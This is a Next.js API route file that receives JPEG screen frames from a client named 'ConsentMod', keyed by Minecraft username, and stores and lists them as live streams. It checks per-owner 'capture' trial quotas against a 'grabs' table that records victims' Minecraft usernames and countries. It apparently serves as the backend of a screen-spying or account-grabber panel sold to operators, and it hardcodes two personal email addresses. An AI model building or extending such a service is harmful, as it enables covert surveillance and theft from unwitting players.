export const dynamic = 'force-dynamic';

import { createClient } from '@supabase/supabase-js';
import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';
import { canUserCapture } from '@/lib/supabase/free-trial';
import { store } from '@/lib/store';

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { auth: { autoRefreshToken: false, persistSession: false } }
  );
}

export async function POST(request) {
  try {
    const authHeader = request.headers.get('authorization');
    const contentType = request.headers.get('content-type') || '';

    let username = 'consentmod';
    if (authHeader) {
      username = authHeader.replace('Bearer ', '').trim() || 'consentmod';
    }

    if (contentType.includes('image/jpeg') || contentType.includes('application/octet-stream')) {
      const buffer = await request.arrayBuffer();
      const nodeBuf = Buffer.from(buffer);

      if (nodeBuf.length < 50) {
        return NextResponse.json({ ok: false, error: 'Empty frame' }, { status: 400 });
      }

      // Always update in-memory hot store for instant livestream / WebRTC streaming
      store.setFrame(nodeBuf, username);

      const base64 = nodeBuf.toString('base64');
      const frame = 'data:image/jpeg;base64,' + base64;

      // Try persisting to Supabase if configured
      try {
        if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
          const supabase = getClient();

          const { data: grab } = await supabase
            .from('grabs')
            .select('owner_email')
            .eq('minecraft_username', username)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();

          if (grab?.owner_email) {
            const check = await canUserCapture(supabase, grab.owner_email);
            if (!check.allowed) {
              return NextResponse.json({ ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 }, { status: 403 });
            }
          }

          await supabase
            .from('stream_frames')
            .upsert(
              { username, frame, updated_at: new Date().toISOString() },
              { onConflict: 'username' }
            );
        }
      } catch (dbErr) {
        // Log DB warning but do not break real-time stream
        console.warn('DB stream persist warning:', dbErr.message);
      }

      return NextResponse.json({ ok: true, username, timestamp: Date.now() });
    }

    return NextResponse.json({ error: 'Invalid content-type' }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: e.message }, { status: 500 });
  }
}

export async function GET(request) {
  try {
    const { searchParams } = new URL(request.url);
    const username = searchParams.get('username');

    // Case 1: Specific username requested
    if (username) {
      // First check in-memory store
      const memFrame = store.getUserFrame(username);
      const memTime = store.getFrameTime();
      if (memFrame && memTime && Date.now() - memTime < 60000) {
        const base64 = Buffer.from(memFrame).toString('base64');
        return NextResponse.json({
          online: true,
          frame: 'data:image/jpeg;base64,' + base64,
          timestamp: memTime,
          source: 'memory'
        });
      }

      // Check database
      if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
        try {
          const supabase = getClient();
          const { data: row } = await supabase
            .from('stream_frames')
            .select('frame, updated_at')
            .eq('username', username)
            .single();

          if (row && Date.now() - new Date(row.updated_at).getTime() < 60000) {
            return NextResponse.json({
              online: true,
              frame: row.frame,
              timestamp: new Date(row.updated_at).getTime(),
              source: 'supabase'
            });
          }
        } catch (dbErr) {
          console.warn('Supabase fetch frame error:', dbErr.message);
        }
      }

      return NextResponse.json({ online: false });
    }

    // Case 2: List all online streams
    const onlineMap = new Map();
    const now = Date.now();

    // From in-memory store
    const memOnline = store.getOnlineUsers();
    for (const u of memOnline) {
      onlineMap.set(u.username.toLowerCase(), {
        username: u.username,
        timestamp: u.timestamp,
        type: 'ConsentMod Feed'
      });
    }

    // From Supabase stream_frames (5 minutes window)
    if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
      try {
        const supabase = getClient();
        const { data: allFrames } = await supabase
          .from('stream_frames')
          .select('username, updated_at');

        if (allFrames) {
          for (const f of allFrames) {
            const time = new Date(f.updated_at).getTime();
            if (now - time < 300000) { // 5 minutes window
              if (!onlineMap.has(f.username.toLowerCase())) {
                onlineMap.set(f.username.toLowerCase(), {
                  username: f.username,
                  timestamp: time,
                  type: 'ConsentMod Feed'
                });
              }
            }
          }
        }

        // Also check recent captures in grabs table (15 minutes window)
        const { data: recentGrabs } = await supabase
          .from('grabs')
          .select('minecraft_username, country, created_at')
          .order('created_at', { ascending: false })
          .limit(20);

        if (recentGrabs) {
          for (const g of recentGrabs) {
            if (g.minecraft_username && !onlineMap.has(g.minecraft_username.toLowerCase())) {
              const grabTime = new Date(g.created_at).getTime();
              if (now - grabTime < 900000) {
                onlineMap.set(g.minecraft_username.toLowerCase(), {
                  username: g.minecraft_username,
                  country: g.country,
                  timestamp: grabTime,
                  type: 'Active Session'
                });
              }
            }
          }
        }
      } catch (dbErr) {
        console.warn('Supabase fetch all frames error:', dbErr.message);
      }
    }

    const online = Array.from(onlineMap.values());
    return NextResponse.json({ online });
  } catch (err) {
    return NextResponse.json({ ok: false, error: err.message, online: [] }, { status: 500 });
  }
}